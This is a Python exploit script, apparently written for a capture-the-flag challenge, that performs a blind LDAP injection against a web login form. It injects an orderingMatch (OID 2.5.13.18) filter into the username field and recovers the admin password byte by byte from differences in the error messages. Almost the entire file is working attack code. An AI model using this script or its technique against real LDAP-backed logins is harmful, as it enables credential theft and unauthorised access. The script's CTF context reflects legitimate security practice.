#!/usr/bin/python3
import requests

"""
Inspired by https://swisskyrepo.github.io/PayloadsAllTheThings/LDAP%20Injection/
"""

def send_request(username):
    url = "http://btfryxiw.playat.flagyard.com/login"
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Origin": "http://btfryxiw.playat.flagyard.com",
        "Connection": "keep-alive",
        "Priority": "u=0"
    }

    boundary = "----geckoformboundary533d8ac55e6a44d466cd9c4fed0292ff"
    data = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="username"\r\n\r\n'
        f"{username}\r\n"
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="password"\r\n\r\n'
        f"test\r\n"
        f"--{boundary}--\r\n"
    )

    headers["Content-Type"] = f"multipart/form-data; boundary={boundary}"

    proxies = {
        "http": "http://127.0.0.1:8080",
        "https": "http://127.0.0.1:8080"
    }

    try:
        r = requests.post(url, headers=headers, data=data, proxies=proxies, timeout=5)
        return "Invalid password" in r.text
    #if triggere Username not found FALSE
    except requests.RequestException:
        print("Network error—retry or check connection.")
        return False

def extract_byte(prefix):
    """
        OK Lets start the BLind LDAP injection attack implementing OID 2.5.13.18
    """
    for test_hex in range(0x100):
        escaped_byte = f"\\{test_hex:02x}"
        #inject into exploit string
        username = f"admin)(userPassword:2.5.13.18:={prefix}{escaped_byte}"
        if send_request(username):
            return test_hex
    return None


def main():
    password_bytes = b""
    escaped_prefix = ""
    #I think that password cannot be longer than 100 chars :)
    for pos in range(1, 100):  
        byte_value = extract_byte(escaped_prefix)
        if byte_value is not None:
            # Decrement TRUE hex by 1 to be conform with  
            saved_byte_value = byte_value - 1
            escaped_byte_for_prefix = f"\\{saved_byte_value:02x}"
            escaped_prefix += escaped_byte_for_prefix
            password_bytes += bytes([saved_byte_value])
            char = chr(saved_byte_value)
            print(f"Found byte {pos}: 0x{saved_byte_value:02x} ('{char}'); current payload suffix: {escaped_byte_for_prefix}")
        else:
            print(f"\nExtracted password in hex: {''.join([f'\\{b:02x}' for b in password_bytes])}")  # Display saved (decremented) bytes as escaped hex
            break

    try:
        print(f"As string: {password_bytes.decode('utf-8')}")
    except UnicodeDecodeError:
        print("Some bytes are not printable..?")

main()

